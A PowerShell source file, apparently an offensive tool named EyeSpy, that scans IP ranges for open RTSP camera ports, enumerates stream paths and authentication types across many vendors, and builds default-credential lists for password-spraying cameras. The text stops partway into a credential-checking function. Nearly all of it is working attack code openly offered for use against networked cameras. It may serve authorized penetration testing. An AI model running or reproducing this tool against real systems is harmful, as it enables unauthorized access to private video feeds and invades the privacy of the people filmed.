function EyeSpy {
    [CmdletBinding(DefaultParameterSetName = 'Default')]
    Param(
        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
        [String]$Search,
        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
        [String]$NoAuth,
        [Parameter(Mandatory = $False, ParameterSetName = 'AuthAttack')]
        [String]$AuthAttack,
        [Parameter(Mandatory = $False, ParameterSetName = 'AuthAttack')]
        [String]$Path,
        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
        [String]$Auto,
        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
        [ValidateRange(10, 2000)]
        [int]$Timeout = 200,
        [Parameter(Mandatory = $False)]
        [String]$Username,
        [Parameter(Mandatory = $False)]
        [String]$Password,
        [Parameter(Mandatory = $False)]
        [String]$Creds,
        [Parameter(Mandatory = $False, ParameterSetName = 'Default')]
        [Switch]$Help,
        [Parameter(Mandatory = $False)]
        [Switch]$Common

    )

    if ($Help) {

        $HelpOutput = @'
========================================================================================================
               
========================================================================================================
                                 _______             _______             
                                |    ___.--.--.-----|     __.-----.--.--.
                                |    ___|  |  |  -__|__     |  _  |  |  |
                                |_______|___  |_____|_______|   __|___  |
                                        |_____|             |__|  |_____|   
                                
========================================================================================================
                                By: Miiden
========================================================================================================
 
Check GitHub for more detailed descriptions.

General Usage Parameters:
+======================================================================================================+
|     Parameter     |   Value    |                  Description                                        |
+===================+============+=====================================================================+
|      -Search      | IP(/Range) | Scans the provided IP/Range for Open RTSP Ports.                    |
|      -NoAuth      | IP(/Range) | Checks the provided IP/Range if authentication is required.         |
|       -Auto       | IP(/Range) | All of the above automatically.                                     |
+===================+============+=====================================================================+
|    -AuthAttack    | IP:Port    | Performs a Password spray attack on provided targets.               |
|       -Path       | 'Path'     | Requires -AuthAttack, Set a Known Path to Attack                    |
+======================================================================================================+

Optional Parameters:
+======================================================================================================+
|     Parameter     |   Value    |                  Description                                        |
+===================+============+=====================================================================+
| -Timeout          | (10-2000)  | (Default: 200) Set Global Receive Timeout Value.                    |
| -Username         | 'username' | Custom username with default password list.                         |
| -Password         | 'password' | Custom password with default username list.                         |
| -Creds            | 'FilePath' | Path to credentials file (username:password per line).              |
| -Common           |    N/A     | Use common paths only (faster scanning, fewer paths tested).       |
| -Verbose          |    N/A     | Show detailed RTSP request/response packets for troubleshooting.    |
| -Help             |    N/A     | Shows this Help.                                                    |
+======================================================================================================+

Example Usage:

# Search for common open RTSP ports on a single IP or across a range.
  EyeSpy -Search 192.168.0.1/24

# Searches for common open RTSP ports and checks common paths if authentication is required.
  EyeSpy -NoAuth 192.168.0.123
 
# Performs a password spraying attack with common credentials on a known open IP:Port
  EyeSpy -AuthAttack 192.168.0.13:8554

# Performs a password spraying attack with common credentials on a known open IP:Port/Path
  EyeSpy -AuthAttack 192.168.0.200:554 -Path 'MyStream'

# Performs all of the above automatically across a single IP or Range
  Eyespy -Auto 192.168.0.1/24

# Use custom username with all default passwords
  EyeSpy -AuthAttack 192.168.0.100:554 -Username 'admin'

# Use custom password with all default usernames
  EyeSpy -Auto 192.168.0.1/24 -Password 'secret123'

# Use a single custom credential pair
  EyeSpy -AuthAttack 192.168.0.100:554 -Username 'admin' -Password 'secret'

# Load credentials from a file (one username:password per line)
  EyeSpy -Auto 192.168.0.1/24 -Creds 'C:\path\to\creds.txt'

# Enable verbose output to see full RTSP packets (for troubleshooting)
  EyeSpy -AuthAttack 192.168.0.100:554 -Username 'admin' -Password 'secret' -Verbose

# Use common paths only for faster scanning (works with -Auto, -AuthAttack, -Search)
  EyeSpy -Auto 192.168.0.1/24 -Common

# Shows this help message
  Eyespy -Help

========================================================================================================
'@

        Write-Output $HelpOutput
        return

    }

    $Banner = @'
=========================================================
               
=========================================================
         _______             _______             
        |    ___.--.--.-----|     __.-----.--.--.
        |    ___|  |  |  -__|__     |  _  |  |  |
        |_______|___  |_____|_______|   __|___  |
                |_____|             |__|  |_____|   
                                
=========================================================
                By: Miiden
=========================================================
'@

    if (!$Search -and !$Auto -and !$NoAuth -and !$AuthAttack) {
    
        Write-Host
        Write-Host "[!] " -ForegroundColor "Red" -NoNewline
        Write-Host "You must Use either -Search, -NoAuth, -AuthAttack or -Auto"
    
        Write-Host "[!] " -ForegroundColor "Red" -NoNewline
        Write-Host "Run 'EyeSpy -Help' for command line usage"
        Write-Host
    
        return
    
    }

    $Banner
    Write-Host "Options:`r`n"
    Write-Host -NoNewline -ForegroundColor Yellow "[#]"
    Write-Host -NoNewline " Global Receive Timeout Set To`: "
    Write-Host -ForegroundColor Magenta "$Timeout`r`n"
    Write-Host "=========================================================`r`n"

    if ($Search) {

        if ($search -match '^\b((25[0-5]|(2[0-4]|1\d|[1-9]|)\d)\.?\b){4}(\/\b(1[6-9]|2[0-9]|3[0-2])\b)?$') {
        
            Scan -Targets $Search

        } else {

            Write-Host -NoNewline -ForegroundColor Red "[-]"
            Write-Host ' Please ensure you are entering a valid IP(/CIDR) e.g. 10.0.0.1 or 192.168.0.0/24'
        }


    } elseif ($NoAuth){

        if ($NoAuth -match '^\b((25[0-5]|(2[0-4]|1\d|[1-9]|)\d)\.?\b){4}(\/\b(1[6-9]|2[0-9]|3[0-2])\b)?$') {
        
            NoAuthScan -Targets $NoAuth

        } else {

            Write-Host -NoNewline -ForegroundColor Red "[-]"
            Write-Host ' Please ensure you are entering a valid IP(/CIDR) e.g. 10.0.0.1 or 192.168.0.0/24'
        }
     

    } elseif ($AuthAttack){

        if ($AuthAttack -match '^((25[0-5]|(2[0-4]|1\d|[1-9]|)\d)\.?\b){4}:\b((6553[0-5])|(655[0-2][0-9])|(65[0-4][0-9]{2})|(6[0-4][0-9]{3})|([1-5][0-9]{4})|([0-5]{0,5})|([0-9]{1,4}))\b$') {
            if ($Path) {
                Write-Host -NoNewline -ForegroundColor Yellow "[?]"
                Write-Host " Please note that if no credentials are found the path could be invalid."
                Write-Host -NoNewline -ForegroundColor Yellow "[?]"
                Write-Host " Try with -NoAuth or -Auto next.`r`n"
                
                AuthAttack -Target $AuthAttack -Path $Path -CustomUsername $Username -CustomPassword $Password -CustomCreds $Creds

            } else {
                Write-Host -NoNewline -ForegroundColor Yellow "[?]"
                Write-Host " Checking Connection and Paths at Target`r`n"

                $result = AuthAttack -Target $AuthAttack -CustomUsername $Username -CustomPassword $Password -CustomCreds $Creds -Common:$Common
            }
        
        } else {
            Write-Host -NoNewline -ForegroundColor Red "[-]"
            Write-Host " Please ensure you are entering a valid IP:Port combination e.g. 10.0.0.1:554"

        }  
     
    } elseif ($Auto){

        if ($Auto -match '^\b((25[0-5]|(2[0-4]|1\d|[1-9]|)\d)\.?\b){4}(\/\b(1[6-9]|2[0-9]|3[0-2])\b)?$') {
        
            FullAuto -Targets $Auto -CustomUsername $Username -CustomPassword $Password -CustomCreds $Creds -Common:$Common

        } else {

            Write-Host -NoNewline -ForegroundColor Red "[-]"
            Write-Host ' Please ensure you are entering a valid IP(/CIDR) e.g. 10.0.0.1 or 192.168.0.0/24'

        }

    }
}

function Get-IpRange {
    [CmdletBinding(ConfirmImpact = 'None')]
    Param(
        [Parameter(Mandatory, ValueFromPipeline, Position = 0)]
        [string[]] $Target
    )

    process {
        $Computers = @()
        foreach ($subnet in $Target) {
            if ($subnet -match '^((25[0-5]|(2[0-4]|1\d|[1-9]|)\d)\.?\b){4}$') {
                # Treat as a single IP address
                $Computers += $subnet
            }
            elseif ($subnet -match '^((25[0-5]|(2[0-4]|1\d|[1-9]|)\d)\.?\b){4}/\b(1[6-9]|2[0-9]|3[0-2])\b$') {
                # CIDR notation processing
                $IP = ($subnet -split '\/')[0]
                [int]$SubnetBits = ($subnet -split '\/')[1]
                if ($SubnetBits -lt 16 -or $SubnetBits -gt 30) {
                    Write-Warning -Message 'Enter a CIDR value between 16 and 30'
                    break 2
                }
                $Octets = $IP -split '\.'
                $IPInBinary = @()
                foreach ($Octet in $Octets) {
                    $OctetInBinary = [convert]::ToString($Octet, 2).PadLeft(8, '0')
                    $IPInBinary += $OctetInBinary
                }
                $IPInBinary = $IPInBinary -join ''
                $HostBits = 32 - $SubnetBits
                $NetworkIDInBinary = $IPInBinary.Substring(0, $SubnetBits)

                $imax = [convert]::ToInt32(('1' * $HostBits), 2) - 1 # -1 to remove broadcast address
                For ($i = 1; $i -le $imax; $i++) {
                    $NextHostIDInDecimal = $i
                    $NextHostIDInBinary = [convert]::ToString($NextHostIDInDecimal, 2).PadLeft($HostBits, '0')
                    $NextIPInBinary = $NetworkIDInBinary + $NextHostIDInBinary
                    $IP = @()
                    For ($x = 0; $x -lt 4; $x++) {
                        $StartCharNumber = $x * 8
                        $IPOctetInBinary = $NextIPInBinary.Substring($StartCharNumber, 8)
                        $IPOctetInDecimal = [convert]::ToInt32($IPOctetInBinary, 2)
                        $IP += $IPOctetInDecimal
                    }
                    $IP = $IP -join '.'
                    $Computers += $IP
                }
            }
            else {
                Write-Host -ForegroundColor red "Value`: [$subnet] is not in a valid format"
                return
            }
        }
        # Remember: Only returns an IP list, not active hosts.
        return $Computers
    }
}

function GenerateDigest {
    [CmdletBinding()]
    param (
        [Parameter(Mandatory)]
        [string]$username,
        [Parameter(Mandatory)]
        [string]$password,
        [Parameter(Mandatory)]
        [string]$realm,
        [Parameter(Mandatory)]
        [string]$uri,
        [Parameter(Mandatory)]
        [string]$nonce
    )

        # Goal is to create this:
        # $finalResponse = MD5(username:realm:password):nonce:MD5(method:uri)
        
        # Concatenate username, realm, and password with colon (:) separator
        $userRealmPass = "$username`:$realm`:$password"

        # Calculate MD5 hash of username:realm:password
        $userRealmPassHash = [System.Security.Cryptography.MD5]::Create().ComputeHash([System.Text.Encoding]::UTF8.GetBytes($userRealmPass))
        $hash1 = [System.BitConverter]::ToString($userRealmPassHash) -replace '-', ''
        $URPhash = $hash1.toLower()

        # Concatenate method and URI with colon (:) separator
        $methodUri = "DESCRIBE`:$uri"

        # Calculate MD5 hash of method:uri
        $methodUriHash = [System.Security.Cryptography.MD5]::Create().ComputeHash([System.Text.Encoding]::UTF8.GetBytes($methodUri))
        $hash2 = [System.BitConverter]::ToString($methodUriHash) -replace '-', ''
        $MUhash = $hash2.toLower()

        # Concatenate MD5 hash of username:realm:password, nonce, and MD5 hash of method:uri with colon (:) separator
        $responseString = "$URPhash`:$nonce`:$MUhash"

        # Calculate MD5 hash of concatenated string
        $responseHash = [System.Security.Cryptography.MD5]::Create().ComputeHash([System.Text.Encoding]::UTF8.GetBytes($responseString))
        $responseHashHex = [System.BitConverter]::ToString($responseHash) -replace '-', ''

        $finalResponse = $responseHashHex.ToLower()
        
        return $finalResponse

}

function Invoke-RtspRequest {
    <#
    .SYNOPSIS
    Sends an RTSP request and returns parsed response with status line and headers.
    
    .DESCRIPTION
    Centralizes RTSP request/response handling with proper timeout control,
    bounded reads, and consistent resource disposal.
    #>
    [CmdletBinding()]
    param (
        [Parameter(Mandatory)]
        [string]$IP,
        
        [Parameter(Mandatory)]
        [int]$Port,
        
        [Parameter(Mandatory)]
        [string]$Method,
        
        [Parameter(Mandatory)]
        [string]$Uri,
        
        [Parameter()]
        [string[]]$Headers = @(),
        
        [Parameter()]
        [int]$ReceiveTimeoutMs = 200,
        
        [Parameter()]
        [int]$MaxLinesToRead = 50
    )
    
    $CRLF = [char]13 + [char]10
    $tcpClient = $null
    $stream = $null
    $writer = $null
    $reader = $null
    
    try {
        # Build the request
        $requestLines = @("$Method $Uri RTSP/1.0")
        $requestLines += $Headers
        $requestLines += ""  # Empty line to end headers
        $request = ($requestLines -join $CRLF) + $CRLF
        
        # Connect and send
        $tcpClient = New-Object System.Net.Sockets.TcpClient
        $tcpClient.ReceiveTimeout = $ReceiveTimeoutMs
        $tcpClient.Connect($IP, $Port)
        
        $stream = $tcpClient.GetStream()
        $stream.ReadTimeout = $ReceiveTimeoutMs  # Set stream timeout as well
        $writer = New-Object System.IO.StreamWriter($stream)
        $writer.Write($request)
        $writer.Flush()
        
        # Read response with bounded line count
        $reader = New-Object System.IO.StreamReader($stream)
        $statusLine = $null
        $responseHeaders = @()
        $linesRead = 0
        
        # Read status line
        if (!$reader.EndOfStream -and $linesRead -lt $MaxLinesToRead) {
            $statusLine = $reader.ReadLine()
            $linesRead++
        }
        
        # Read headers until blank line or limit
        while (!$reader.EndOfStream -and $linesRead -lt $MaxLinesToRead) {
            $line = $reader.ReadLine()
            $linesRead++
            
            if ([string]::IsNullOrWhiteSpace($line)) {
                break  # End of headers
            }
            
            $responseHeaders += $line
        }
        
        return [PSCustomObject]@{
            StatusLine = $statusLine
            Headers    = $responseHeaders
            Success    = $statusLine -match 'RTSP/1\.0 (\d{3})'
            StatusCode = if ($statusLine -match 'RTSP/1\.0 (\d{3})') { [int]$matches[1] } else { 0 }
            IP         = $IP
            Port       = $Port
            Uri        = $Uri
        }
        
    }
    catch {
        return [PSCustomObject]@{
            StatusLine = $null
            Headers    = @()
            Success    = $false
            StatusCode = 0
            IP         = $IP
            Port       = $Port
            Uri        = $Uri
            Error      = $_.Exception.Message
        }
    }
    finally {
        if ($null -ne $reader) { $reader.Dispose() }
        if ($null -ne $writer) { $writer.Dispose() }
        if ($null -ne $stream) { $stream.Dispose() }
        if ($null -ne $tcpClient) { $tcpClient.Dispose() }
    }
}

function Get-OpenRTSPPorts {
    [CmdletBinding()]
    param (
        [Parameter(Mandatory, ValueFromPipeline)]
        [string[]]$IPAddress
    )

    Write-Host "Checking for IPs with Open RTSP Ports:`r`n"
    $openPorts = [System.Collections.Concurrent.ConcurrentBag[PSCustomObject]]::new()

    # Create the runspace pool
    $runspacePool = [runspacefactory]::CreateRunspacePool(1, [System.Environment]::ProcessorCount)
    $runspacePool.Open()

    $runspaces = foreach ($ip in $IPAddress) {
        $runspace = [powershell]::Create().AddScript({
			param ($ip, $ports, $openPorts)

            foreach ($port in $ports) {
                try {
                    $tcpClient = [System.Net.Sockets.TcpClient]::new()
                    $tcpClient.SendTimeout = 100
                    $tcpClient.ReceiveTimeout = 100
                    $awaitResult = $tcpClient.BeginConnect($ip, $port, $null, $null)
                    $success = $awaitResult.AsyncWaitHandle.WaitOne(100, $false)

                    if ($success) {
                        $tcpClient.EndConnect($awaitResult)
                        if ($tcpClient.Connected) {
                            [void]$openPorts.Add([PSCustomObject]@{
                                IPAddress = $ip
                                Port      = $port
                                Status    = "Open"
                            })

                        }
                    }
                } catch {
                    # Do nothing
                } finally {
					if ($null -ne $tcpClient) { $tcpClient.Close(); $tcpClient.Dispose() }
                }
            }
		}).AddArgument($ip).AddArgument((554, 8554, 5554)).AddArgument($openPorts)

        $runspace.RunspacePool = $runspacePool
        [PSCustomObject]@{ Pipe = $runspace; Status = $runspace.BeginInvoke() }
    }

    # Ensure all runspaces are properly closed and disposed of
    try {
        $runspacesCompleted = $runspaces | ForEach-Object {
            try {
                $_.Pipe.EndInvoke($_.Status)
            } catch {
                Write-Error "Error ending invoke: $_"
            } finally {
                $_.Pipe.Dispose()
            }
        }
    } finally {
        try {
            $runspacePool.Close()
        } catch {
            Write-Error "Error closing runspace pool: $_"
        } finally {
            $runspacePool.Dispose()
        }
    }

    $validIPPorts = $openPorts | ForEach-Object {
        if ($_.Status -eq "Open") {
            [PSCustomObject]@{
                IPAddress = $_.IPAddress
                Port      = $_.Port
                Status    = "Open"
            }
        }
    }

    if ($validIPPorts.Count -eq 0) {
        Write-Host -NoNewline -ForegroundColor Red "[-]"
        Write-Host -NoNewline " No Open RTSP Ports detected.`r`n"
        return @()
    }

    Write-Host -NoNewline -ForegroundColor Green "`r`n[+]"
    Write-Host " Valid IPs With Open Ports Discovered.`r`n"
    Write-Host "========================================================="

    foreach ($result in $validIPPorts) {
        Write-Host -NoNewline -ForegroundColor Green "[+]"
        Write-Host -NoNewline " Open: "
        Write-Host -ForegroundColor Green "$($result.IPAddress):$($result.Port)"
    }

    return $validIPPorts
}

function Get-AuthType {
    [CmdletBinding()]
    param (
        [Parameter(Mandatory)]
        [PSCustomObject[]]$OpenPorts
    )

    # Use 1st Fake Route, to try and determine auth type, if that fails use a few common ones to try and find the auth type.
    # Namely, Fake, Axis, Dahua, Hikvision
    $authTestPath = @("TWlpZGVu", "axis-media/media.amp", "cam/realmonitor", "Streaming/Channels/101")
    $foundAuth = @()

    Write-Host "`r`nChecking for Auth Types`:`r`n"

    foreach ($openPort in $OpenPorts) {    
        $ip = $openPort.IPAddress
        $port = $openPort.Port
        $authDetected = $false
        $unknownAuth = $false

        foreach ($testPath in $authTestPath) {
            if ($authDetected) { break }  # Exit inner loop if auth type found

            $authtyperesult = @()
            
            # Use the centralized RTSP helper
            $response = Invoke-RtspRequest -IP $ip -Port $port -Method "DESCRIBE" `
                -Uri "rtsp://$ip`:$port/$testPath" -Headers @("CSeq: 1") `
                -ReceiveTimeoutMs $Timeout

            if ($response.Success) {
                # Extract Server header for vendor hints
                $serverHeader = $response.Headers | Where-Object { $_ -match "(?i)^Server:" } | Select-Object -First 1
                $serverValue = if ($serverHeader -match "(?i)^Server:\s*(.+)$") { $matches[1].Trim() } else { "Unknown" }
                
                # Check headers for authentication type
                $authHeader = $response.Headers | Where-Object { $_ -match "(?i)^WWW-Authenticate:" } | Select-Object -First 1
                
                if ($authHeader -match "(?i)\bdigest\b") {
                    Write-Host -ForegroundColor Yellow -NoNewline "Found Digest`: "
                    Write-Host "$ip`:$port (Server: $serverValue)"
                    $authtyperesult += [PSCustomObject]@{
                        IPAddress = $ip
                        Port      = $port
                        Status    = "Open"
                        authType  = "Digest"
                        Server    = $serverValue
                    }
                    $authDetected = $true
                } 
                elseif ($authHeader -match "(?i)\bbasic\b") {
                    Write-Host -ForegroundColor Yellow -NoNewline "Found Basic`: "
                    Write-Host "$ip`:$port (Server: $serverValue)"
                    $authtyperesult += [PSCustomObject]@{
                        IPAddress = $ip
                        Port      = $port
                        Status    = "Open"
                        authType  = "Basic"
                        Server    = $serverValue
                    }
                    $authDetected = $true
                }
                elseif ($response.StatusCode -eq 404) {
                    $unknownAuth = $true
                }
                elseif ($response.StatusCode -eq 200) {
                    # No auth required
                    if ($authtyperesult.Count -eq 0) {
                        Write-Host -ForegroundColor Yellow -NoNewline "Found NoAuth`: "
                        Write-Host "$ip`:$port (Server: $serverValue)"
                        $foundAuth += [PSCustomObject]@{
                            IPAddress = $ip
                            Port      = $port
                            Status    = "Open"
                            authType  = "none"
                            Server    = $serverValue
                        }
                        $authDetected = $true
                    }
                }
            }
            else {
                # Connection failed or error
                $unknownAuth = $true
            }

            if ($authtyperesult.Count -gt 0) {
                $foundAuth += $authtyperesult
            }
        }

        if ($unknownAuth -and !$authDetected) {
            Write-Host -ForegroundColor Yellow -NoNewline "Unknown Auth`: "
            Write-Host "$ip`:$port"
            $foundAuth += [PSCustomObject]@{
                IPAddress = $ip
                Port      = $port
                Status    = "Open"
                authType  = "Unknown"
                Server    = "Unknown"
            }
        }
    }

    Write-Host -NoNewline -ForegroundColor Green "`r`n[+]"
    Write-Host " Found Required Auth Types`r`n"
    Write-Host "=========================================================`r`n"

    return $foundAuth
}

function Get-ValidRTSPPaths {
    [CmdletBinding()]
    param (
        [Parameter(Mandatory)]
        [PSCustomObject[]]$OpenPorts,
        [Parameter(Mandatory = $False)]
        [Switch]$UseCommonPaths
    )

    $Paths = @( "", "0/1", "0/video1", "1", "axis-media/media.amp","cam/realmonitor","Streaming/Channels/101",
    "1.AMP", "1/h264major", "1/main", "1/stream1", "1080p", "11", "12", "125", "1440p", "480p", "4K", "666", 
    "720p", "access_code", "access_name_for_stream_1_to_5","api/mjpegvideo.cgi", "av0_0", "av2", "avc", "avn=2",
    "AVStream1_1", "axis-media/media.amp?camera=1", "axis-media/media.amp?videocodec=h264", "cam",
    "cam/realmonitor?channel=0&subtype=0", "cam/realmonitor?channel=1&subtype=0", "cam/realmonitor?channel=1&subtype=1",
    "cam/realmonitor?channel=1&subtype=1&unicast=true&proto=Onvif", "CAM_ID.password.mp2", "cam0", "cam0_0", "cam0_1",
    "cam1", "cam1/h264", "cam1/h264/multicast", "cam1/mjpeg", "cam1/mpeg4", "cam1/mpeg4?user='username'&pwd='password'",
    "cam1/onvif-h264", "camera.stm", "ch0", "ch0_0.h264", "ch0_unicast_firststream", "ch0_unicast_secondstream",
    "ch00/0", "ch001.sdp", "CH001.sdp", "ch01.264", "ch01.264?", "ch01.264?ptype=tcp", "ch1/0", "ch1_0", "ch1-s1",
    "ch2/0", "ch2_0", "ch3/0", "ch3_0", "ch4/0", "ch4_0", "channel1", "GetData.cgi", "gnz_media/main", "h264",
    "h264.sdp", "h264/ch1/sub/av_stream","h264/media.amp", "h264_stream", "h264_vga.sdp", "h264Preview_01_main",
    "h264Preview_01_sub", "HD", "HighResolutionVideo", "image.mpg", "img/media.sav", "img/media.sav?channel=1",
    "img/video.asf", "img/video.sav", "ioImage/1", "ipcam.sdp", "ipcam_h264.sdp", "ipcam_mjpeg.sdp", "live",
    "live.sdp", "live/av0", "live/ch0", "live/ch00_0", "live/ch01_0", "live/ch01_0", "live/h264", "live/main",
    "live/main0", "live/mpeg4", "live_mpeg4.sdp", "live_st1", "live1.sdp", "live3.sdp", "livestream",
    "LowResolutionVideo", "main", "media", "media.amp", "media.amp?streamprofile=Profile1", "media/media.amp",
    "media/video1", "MediaInput/h264", "MediaInput/mpeg4", "medias2", "mjpeg/media.smp", "mp4", "mpeg/media.amp",
    "mpeg4", "mpeg4/1/media.amp", "mpeg4/media.amp", "mpeg4/media.smp", "mpeg4unicast", "mpg4/rtsp.amp",
    "multicaststream", "now.mp4", "nph-h264.cgi", "nphMpeg4/g726-640x", "nphMpeg4/g726-640x48", "nphMpeg4/g726-640x480",
    "nphMpeg4/nil-320x240", "ONVIF/MediaInput", "onvif1", "onvif-media/media.amp", "play1.sdp", "play2.sdp",
    "profile1/media.smp", "profile2/media.smp", "profile5/media.smp", "rtpvideo1.sdp", "rtsp_live0", "rtsp_live1",
    "rtsp_live2", "rtsp_tunnel", "rtsph264", "rtsph2641080p", "snap.jpg", "StdCh1", "stream", "stream.sdp", "stream/0",
    "stream/1", "stream/live.sdp", "stream1", "streaming/channels/0", "streaming/channels/1", "Streaming/Channels/1",
    "Streaming/Unicast/channels/101", "tcp/av0_0", "test", "tmpfs/auto.jpg", "trackID=1",
    "ucast/11", "udpstream", "user.pin.mp2", "v2", "video", "video.3gp", "video.h264", "video.mjpg", "video.mp4",
    "video.pro1", "video.pro2", "video.pro3", "video0", "video0.sdp", "video1", "video1.sdp", "VideoInput/1/h264/1",
    "VideoInput/1/mpeg4/1", "videoinput_1/h264_1/media.stm", "videoMain", "videostream.asf", "vis", "wfov"
    )

    #Common Paths that are often used for authentication, Axis, Hikvision, Dahua, etc. only searches one stream for speed.
    $CommonPaths = @( "1", "MyStream", "Streaming/Channels/101", "Streaming/Channels/1", "axis-media/media.amp", "rtsp_tunnel", 
                     "cam/realmonitor?channel=1&subtype=1", "profile1/media.smp", "stream1", "LiveChannel/0/media.smp", 
                     "ch01/0" ,"media/video1", "0/profile2/media.smp")

    $authRequiredPaths = @()
    
    # Select which path list to use based on the switch
    $pathsToScan = if ($UseCommonPaths) { $CommonPaths } else { $Paths }
    
    Write-Host "`r`nChecking for valid RTSP Paths"
    if ($UseCommonPaths) {
        Write-Host "Using common paths only (fast mode)`r`n" -ForegroundColor Cyan
    } else {
        Write-Host "`r`n"
    }

    # Check if OpenPorts is empty or null
    if ($null -eq $OpenPorts -or $OpenPorts.Count -eq 0) {
        Write-Host "No open ports provided to scan for paths." -ForegroundColor Yellow
        return $authRequiredPaths
    }

    # Group by IP:Port to handle multiple ports per IP
    $portsByIPPort = $OpenPorts | Group-Object -Property { "$($_.IPAddress):$($_.Port)" }
    
    $totalPorts = $portsByIPPort.Count
    
    if ($totalPorts -eq 0) {
        Write-Host "No ports to scan." -ForegroundColor Yellow
        return $authRequiredPaths
    }
    
    $portIndex = 0
    
    foreach ($portGroup in $portsByIPPort) {
        $portIndex++
        $openPort = $portGroup.Group[0]  # Get first item (all have same IP:Port)
        $ip = $openPort.IPAddress
        $port = $openPort.Port
        $authType = $openPort.authType

        Write-Host -NoNewline "Scanning $ip`:$port (Port $portIndex/$totalPorts)... "
        
        $pathIndex = 0
        $totalPaths = $pathsToScan.Count
        $foundAuthPath = $false

        foreach ($path in $pathsToScan) {
            try {
                $pathIndex++
                # Show progress every 50 paths to reduce overhead
                if ($pathIndex % 50 -eq 0 -or $pathIndex -eq $totalPaths) {
                    Write-Host -NoNewline "`rScanning $ip`:$port (Port $portIndex/$totalPorts) - Path $pathIndex/$totalPaths... "
                }
                
                # Use the centralized RTSP helper
                $response = Invoke-RtspRequest -IP $ip -Port $port -Method "DESCRIBE" `
                    -Uri "rtsp://$ip`:$port/$path" -Headers @("CSeq: 1") `
                    -ReceiveTimeoutMs $Timeout

                if ($response.Success) {
                    if ($response.StatusCode -eq 200) {
                        # No auth required - silently continue
                    }
                    elseif ($response.StatusCode -eq 401 -or $response.StatusCode -eq 403) {
                        # Found auth-required path - add it to the list
                        $authRequiredPaths += [PSCustomObject]@{
                            IPAddress = $ip
                            Port      = $port
                            Path      = $path
                            authType  = $authType
                        }
                        $foundAuthPath = $true
                        # Continue scanning to find all auth-required paths for this port
                        # Don't break - we want to test all paths that require auth
                    }
                }
                else {
                    # Silently continue on connection errors
                }
            }
            catch [System.OperationCanceledException] {
                # Ctrl+C pressed during path scanning - move to next port
                Write-Host "`r`n[!] Path scanning interrupted - moving to next port" -ForegroundColor Yellow
                break
            }
            catch {
                # Other errors - continue to next path
                continue
            }
        }
        
        if ($foundAuthPath) {
            Write-Host "`rScanning $ip`:$port complete - Found auth path                    "
        } else {
            Write-Host "`rScanning $ip`:$port complete - No auth path found                    "
        }
    }

    if ($authRequiredPaths.Count -gt 0) {
        Write-Host -NoNewline -ForegroundColor Green "`r`n[+]"
        Write-Host " Potential Paths Found! ($($authRequiredPaths.Count) path(s))`r`n"
        Write-Host "=========================================================`r`n"
    } else {
        Write-Host -NoNewline -ForegroundColor Yellow "`r`n[!]"
        Write-Host " No authentication-required paths found.`r`n"
        Write-Host "=========================================================`r`n"
    }
    
    return $authRequiredPaths
}

function GenerateCreds {
    [CmdletBinding()]
    param (
        [Parameter(Mandatory = $false)]
        [string]$CustomUsername,
        
        [Parameter(Mandatory = $false)]
        [string]$CustomPassword,
        
        [Parameter(Mandatory = $false)]
        [string]$CustomCreds
    )
    
    $UserList = @("admin", "root", "", "666666","888888", "Admin","admin1", 
                  "administrator", "Administrator", "aiphone", "Dinion",
                  "none", "Root", "service", "supervisor", "ubnt"
                )

    $PassList = @("", "0000", "00000", "1111", "111111", "1111111",
                "123", "1234", "12345", "123456", "1234567", "12345678",
                "123456789", "12345678910", "4321", "666666", "6fJjMKYx",
                "888888", "9999", "admin", "admin pass", "Admin", "admin123",
                "administrator", "Administrator", "aiphone", "camera",
                "Camera", "fliradmin", "GRwvcj8j", "hikvision", "hikadmin",
                "HuaWei123", "ikwd", "jvc", "kj3TqCWv", "meinsm", "pass",
                "Pass", "password", "password123", "qwerty", "qwerty123",
                "Recorder", "reolink", "root", "service", "supervisor",
                "support", "system", "tlJwpbo6", "toor", "tp-link", "ubnt",
                "user", "wbox", "wbox123", "Y5eIMz3C"
                )

    # Use a List to avoid quadratic array concatenation costs
    $authStringList = New-Object System.Collections.Generic.List[string]

    # Handle -Creds: Path to a file with username:password entries (one per line)
    if ($CustomCreds) {
        if (Test-Path -Path $CustomCreds -PathType Leaf) {
            $credLines = Get-Content -Path $CustomCreds -ErrorAction SilentlyContinue
            $validCount = 0
            foreach ($line in $credLines) {
                $line = $line.Trim()
                # Split on the first ':' so passwords may contain colons (e.g., admin:pass:word)
                if ($line -and $line -match '^([^:]+):(.*)$') {
                    $fileUser = $matches[1]
                    $filePass = $matches[2]
                    [void]$authStringList.Add([Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("$fileUser`:$filePass")))
                    $validCount++
                }
            }
            if ($validCount -gt 0) {
                Write-Host -ForegroundColor Cyan "[*] Loaded $validCount credential(s) from file: $CustomCreds"
            }
            else {
                Write-Warning "No valid credentials found in file: $CustomCreds. Expected format: username:password (one per line)."
            }
        }
        else {
            Write-Warning "Credentials file not found: $CustomCreds"
        }
    }
    # Handle -Username only: Custom username + hardcoded password list
    elseif ($CustomUsername -and -not $CustomPassword) {
        Write-Host -ForegroundColor Cyan "[*] Using custom username '$CustomUsername' with default password list"
        foreach ($pass in $PassList) {
            [void]$authStringList.Add([Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("$CustomUsername`:$pass")))
        }
    }
    # Handle -Password only: Hardcoded username list + custom password
    elseif ($CustomPassword -and -not $CustomUsername) {
        Write-Host -ForegroundColor Cyan "[*] Using default username list with custom password '$CustomPassword'"
        foreach ($user in $UserList) {
            [void]$authStringList.Add([Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("$user`:$CustomPassword")))
        }
    }
    # Handle -Username AND -Password: Single custom credential only
    elseif ($CustomUsername -and $CustomPassword) {
        Write-Host -ForegroundColor Cyan "[*] Using custom credentials: $CustomUsername`:$CustomPassword"
        [void]$authStringList.Add([Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("$CustomUsername`:$CustomPassword")))
    }
    # No custom credentials: Use full default list
    else {
        foreach ($user in $UserList){
            foreach ($pass in $PassList) {
                [void]$authStringList.Add([Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("$user`:$pass")))
            }
        }
    }

    return $authStringList.ToArray()
}

function Get-ValidRTSPCredential {
    [CmdletBinding()]
    param (
        [Parameter(Mandatory)]
        [string]$IP,
        [Parameter(Mandatory)]
        [int]$Port,
        [Parameter(Mandatory)]
        [string]$Path,
        [Parameter(Mandatory)]
        [string]$authType,
